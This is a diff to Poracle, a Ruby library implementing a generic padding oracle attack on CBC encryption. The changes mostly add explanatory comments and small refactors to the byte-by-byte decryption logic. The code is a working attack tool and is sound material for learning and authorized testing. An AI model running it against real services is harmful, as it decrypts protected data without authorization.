@@ -25,7 +25,7 @@
 #  0 to 255.
 #
 # See LocalTestModule.rb and RemoteTestModule.rb for examples of how this can
-# be made.
+# be implemented.
 ##
 #
 
@@ -63,31 +63,44 @@ module Poracle
   def Poracle.find_character(mod, character, block, previous, plaintext, character_set, verbose = false)
     # First, generate a good C' (C prime) value, which is what we're going to
     # set the previous block to. It's the plaintext we have so far, XORed with
-    # the expected padding, XORed with the previous block
+    # the expected padding, XORed with the previous block. This is like the
+    # ketchup in the secret sauce.
     blockprime = "\0" * mod.blocksize
     (mod.blocksize - 1).step(character + 1, -1) do |i|
       blockprime[i] = (ord(plaintext[i]) ^ (mod.blocksize - character) ^ ord(previous[i])).chr
     end
 
-    # Try all possible characters
+    # Try all possible characters in the set (hopefully the set is exhaustive)
     character_set.each do |current_guess|
+      # Calculate the next character of C' based on tghe plaintext character we
+      # want to guess. This is the mayo in the secret sauce.
       blockprime[character] = ((mod.blocksize - character) ^ ord(previous[character]) ^ ord(current_guess)).chr
 
+      # Ask the mod to attempt to decrypt the string. This is the last
+      # ingredient in the secret sauce - the relish, as it were.
       result = mod.attempt_decrypt(blockprime + block)
+
+      # Increment the number of guesses (for reporting/output purposes)
       @@guesses += 1
 
+      # If it successfully decrypted, we found the character!
       if(result)
         # Validate the result if we're working on the last character
         false_positive = false
         if(character == mod.blocksize - 1)
-          blockprime_test = blockprime.clone
-          blockprime_test[character - 1] = (ord(blockprime_test[character - 1]) ^ 1).chr
-          if(!mod.attempt_decrypt(blockprime_test + block))
-            puts("Hit a false positive!")
+          # Modify the second-last character in any way (we XOR with 1 for
+          # simplicity)
+          blockprime[character - 1] = (ord(blockprime[character - 1]) ^ 1).chr
+          # If the decryption fails, we hit a false positive!
+          if(!mod.attempt_decrypt(blockprime + block))
+            if(@verbose)
+              puts("Hit a false positive!")
+            end
             false_positive = true
           end
         end
 
+        # If it's not a false positive, return the character we just found
         if(!false_positive)
           return current_guess
         end
@@ -98,12 +111,16 @@ module Poracle
   end
 
   def Poracle.do_block(mod, block, previous, has_padding = false, verbose = false)
+    # Default result to all question marks - this lets us show it to the user
+    # in a pretty way
     result = "?" * block.length
-    plaintext  = "?" * mod.blocksize
+
+    # It doesn't matter what we default the plaintext to, as long as it's long
+    # enough
+    plaintext = "\0" * mod.blocksize
 
     # Loop through the string from the end to the beginning
-    character = block.length - 1
-    while(character >= 0) do
+    (block.length - 1).step(0, -1) do |character|
       # When character is below 0, we've arrived at the beginning of the string
       if(character >= block.length)
         raise("Could not decode!")
@@ -113,28 +130,36 @@ module Poracle
       # requests
       set = nil
       if(character == block.length - 1 && has_padding)
+        # For the last character of a block with padding, guess the padding
         set = generate_set([1.chr])
       elsif(has_padding && character >= block.length - plaintext[block.length - 1].ord)
+        # If we're still in the padding, guess the proper padding value (it's
+        # known)
         set = generate_set([plaintext[block.length - 1]])
       elsif(mod.respond_to?(:character_set))
+        # If the module provides a character_set, use that
         set = generate_set(mod.character_set)
       else
-        # Generated based on the Battlestar Galactica wikia page (yes, I'm serious :) )
+        # Otherwise, use a common English ordering that I generated based on
+        # the Battlestar Galactica wikia page (yes, I'm serious :) )
         set = generate_set(' eationsrlhdcumpfgybw.k:v-/,CT0SA;B#G2xI1PFWE)3(*M\'!LRDHN_"9UO54Vj87q$K6zJY%?Z+=@QX&|[]<>^{}'.chars.to_a)
       end
 
-
+      # Break the current character (this is the secret sauce)
       c = find_character(mod, character, block, previous, plaintext, set, verbose)
       plaintext[character] = c
+
       if(verbose)
         puts(plaintext)
       end
-      character -= 1
     end
 
     return plaintext
   end
 
+  # This is the public interface. Call this with the mod, data, and optionally
+  # the iv, and it'll return the decrypted text or throw an error if it can't.
+  # If no IV is given, it's assumed to be NULL (all zeroes).
   def Poracle.decrypt(mod, data, iv = nil, verbose = false)
     # Default to a nil IV
     if(iv.nil?)
@@ -158,7 +183,8 @@ module Poracle
       puts(">> %d blocks:" % blockcount)
     end
 
-    # Split the data into blocks
+    # Split the data into blocks - using unpack is kinda weird, but it's the
+    # best way I could find that isn't Ruby 1.9-specific
     blocks = data.unpack("a#{mod.blocksize}" * blockcount)
     i = 0
     blocks.each do |b|
@@ -168,10 +194,12 @@ module Poracle
       end
     end
 
-    # Decrypt all the blocks - from the last to the first (after the IV)
+    # Decrypt all the blocks - from the last to the first (after the IV).
+    # This can actually be done in any order.
     result = ''
     is_last_block = true
     (blocks.size - 1).step(1, -1) do |i|
+      # Process this block - this is where the magic happens
       new_result = do_block(mod, blocks[i], blocks[i - 1], is_last_block, verbose)
       if(new_result.nil?)
         return nil
@@ -191,6 +219,7 @@ module Poracle
       return nil
     end
 
+    # Remove the padding
     result = result[0, result.length - ord(pad_bytes)]
 
     return result
